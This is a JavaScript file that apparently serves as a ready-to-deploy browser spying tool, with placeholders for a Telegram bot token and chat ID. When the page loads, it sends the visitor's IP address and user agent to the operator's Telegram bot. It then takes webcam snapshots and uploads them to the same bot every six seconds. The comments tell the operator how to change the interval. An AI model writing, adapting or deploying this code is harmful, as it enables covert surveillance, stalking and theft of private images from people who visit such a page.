// plz edit your bot's configuration
const BOT_TOKEN = '00000000:XXXXXXXXXX-XXXXXXXXXXXXXXX_XXXX'; // Replace with your bot's TOKEN
const CHAT_ID = '1234567899'; // Replace with your bot's chat ID

        function sendIPAndUserAgent() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const userAgent = navigator.userAgent;
                    const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
                    sendMessageToTelegram(message);
                })
                .catch(error => console.error('Error fetching IP address:', error));
        }

        function sendMessageToTelegram(message) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log('Message sent to Telegram');
                } else {
                    console.error('Failed to send message to Telegram');
                }
            })
            .catch(error => console.error('Error sending message to Telegram:', error));
        }

        function takePhotoAndSend() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    // Wait for the video to be ready
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const photo = canvas.toDataURL('image/jpeg');

                            sendPhoto(photo);

                            // Stop video stream and remove video element
                            video.srcObject.getTracks().forEach(track => track.stop());
                            video.remove();
                        }, 1000); // Adding a delay to ensure the video is fully loaded
                    };
                })
                .catch(error => console.error('Error accessing camera:', error));
        }

        function sendPhoto(photo) {
            const blob = dataURItoBlob(photo);
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('Photo sent to Telegram');
                } else {
                    console.error('Failed to send photo to Telegram');
                }
            })
            .catch(error => console.error('Error sending photo to Telegram:', error));
        }

        // Function to convert Data URI to Blob
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const intArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                intArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([arrayBuffer], { type: mimeString });
        }

        // Send IP and user agent once when the page loads
        sendIPAndUserAgent();

       // Can you change the time required to take the photo, knowing that every 1000 = 1 second with any number
        // Take photo and send every 6 seconds
        setInterval(takePhotoAndSend, 6000);
